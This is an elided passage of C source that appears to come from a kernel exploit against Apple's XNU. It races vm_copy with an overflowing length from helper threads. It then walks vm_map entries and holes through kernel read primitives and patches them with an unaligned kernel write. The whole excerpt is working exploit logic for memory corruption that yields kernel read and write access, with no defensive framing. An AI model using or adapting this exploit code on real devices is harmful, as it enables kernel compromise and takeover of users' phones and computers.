...
void smith_run(struct kfd* kfd)
{
    ...
    kfd_assert(vm_copy(mach_task_self(), smith->vme[2].address, (0ull - smith->vme[2].address - 1), 0) == KERN_PROTECTION_FAILURE);
...
{
    const uint64_t target_hole_size = pages(10000);
...
void* smith_helper_spinner_pthread(void* arg)
{
    ...
    while (!atomic_load(&smith->main_thread_returned)) {
        ...
        kfd_assert((kret == KERN_SUCCESS) || (kret == KERN_INVALID_ADDRESS));
    }
...
void* smith_helper_cleanup_pthread(void* arg)
{
    ...
    do {
         ...
         */
        uint64_t map_kaddr = kfd->info.kernel.current_map;
        uint64_t entry_kaddr = dynamic_kget(vm_map, hdr_links_prev, map_kaddr);

        while (true) {
            uint64_t entry_prev = static_kget(vm_map_entry, uint64_t, links.prev, entry_kaddr);
            uint64_t entry_start = static_kget(vm_map_entry, uint64_t, links.start, entry_kaddr);
            uint64_t entry_end = static_kget(vm_map_entry, uint64_t, links.end, entry_kaddr);
            uint64_t entry_right = static_kget(vm_map_entry, uint64_t, store.entry.rbe_right, entry_kaddr);
...
{
    kfd_assert(kfd->info.kernel.current_map);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    ...
    do {
        ...
        uint64_t entry_kaddr = dynamic_kget(vm_map, hdr_links_next, map_kaddr);
        uint64_t map_entry_kaddr = map_kaddr + dynamic_offsetof(vm_map, hdr_links_prev);
        ...
        while (entry_kaddr != map_entry_kaddr) {
            entry_count++;
            uint64_t entry_next = static_kget(vm_map_entry, uint64_t, links.next, entry_kaddr);
            uint64_t entry_start = static_kget(vm_map_entry, uint64_t, links.start, entry_kaddr);
            uint64_t entry_end = static_kget(vm_map_entry, uint64_t, links.end, entry_kaddr);

            if (entry_count == 1) {
                first_vme_kaddr = entry_kaddr;
                first_vme_parent_store = static_kget(vm_map_entry, uint64_t, store.entry.rbe_parent, entry_kaddr);
                uint64_t first_vme_left_store = static_kget(vm_map_entry, uint64_t, store.entry.rbe_left, entry_kaddr);
                uint64_t first_vme_right_store = static_kget(vm_map_entry, uint64_t, store.entry.rbe_right, entry_kaddr);
                kfd_assert(first_vme_left_store == 0);
                kfd_assert(first_vme_right_store == 0);
            } else if (entry_count == 2) {
                second_vme_kaddr = entry_kaddr;
                second_vme_left_store = static_kget(vm_map_entry, uint64_t, store.entry.rbe_left, entry_kaddr);
            } else if (entry_end == 0) {
                vme_end0_kaddr = entry_kaddr;
                vme_end0_start = entry_start;
                kfd_assert(vme_end0_start == smith->vme[1].address);
            } else if (entry_start == 0) {
                kfd_assert(entry_kaddr == vme_for_store(first_vme_parent_store));
                kfd_assert(entry_kaddr == vme_for_store(second_vme_left_store));
                uint64_t leaked_entry_left_store = static_kget(vm_map_entry, uint64_t, store.entry.rbe_left, entry_kaddr);
                leaked_entry_right_store = static_kget(vm_map_entry, uint64_t, store.entry.rbe_right, entry_kaddr);;
                leaked_entry_parent_store = static_kget(vm_map_entry, uint64_t, store.entry.rbe_parent, entry_kaddr);
                kfd_assert(leaked_entry_left_store == 0);
                kfd_assert(vme_for_store(leaked_entry_right_store) == first_vme_kaddr);
                kfd_assert(vme_for_store(leaked_entry_parent_store) == second_vme_kaddr);
                leaked_entry_prev = static_kget(vm_map_entry, uint64_t, links.prev, entry_kaddr);
                leaked_entry_next = entry_next;
                leaked_entry_end = entry_end;
                kfd_assert(leaked_entry_end == smith->vme[3].address);
            }
        ...
        uint64_t unaligned_kaddr = vme_end0_kaddr + static_offsetof(vm_map_entry, links.start) + 1;
        uint64_t unaligned_uaddr = (uint64_t)(&vme_end0_start_and_next) + 1;
        kwrite_kfd((uint64_t)(kfd), (void*)(unaligned_uaddr), unaligned_kaddr, sizeof(uint64_t));
         ...
         */
        uint64_t nentries_buffer = dynamic_kget(vm_map, hdr_nentries_u64, map_kaddr);
    ...
    do {
        ...
        uint64_t hole_kaddr = dynamic_kget(vm_map, holes_list, map_kaddr);
        ...
        while (true) {
            hole_count++;
            uint64_t hole_next = static_kget(vm_map_links, uint64_t, next, hole_kaddr);
            uint64_t hole_start = static_kget(vm_map_links, uint64_t, start, hole_kaddr);
            uint64_t hole_end = static_kget(vm_map_links, uint64_t, end, hole_kaddr);

            if (hole_start == 0) {
                first_leaked_hole_prev = static_kget(vm_map_links, uint64_t, prev, hole_kaddr);
                first_leaked_hole_next = hole_next;
                first_leaked_hole_end = hole_end;
                kfd_assert(prev_hole_end == smith->vme[1].address);
            } else if (hole_start == smith->vme[1].address) {
                second_leaked_hole_prev = static_kget(vm_map_links, uint64_t, prev, hole_kaddr);
                second_leaked_hole_next = hole_next;
                kfd_assert(hole_end == smith->vme[2].address);
            }
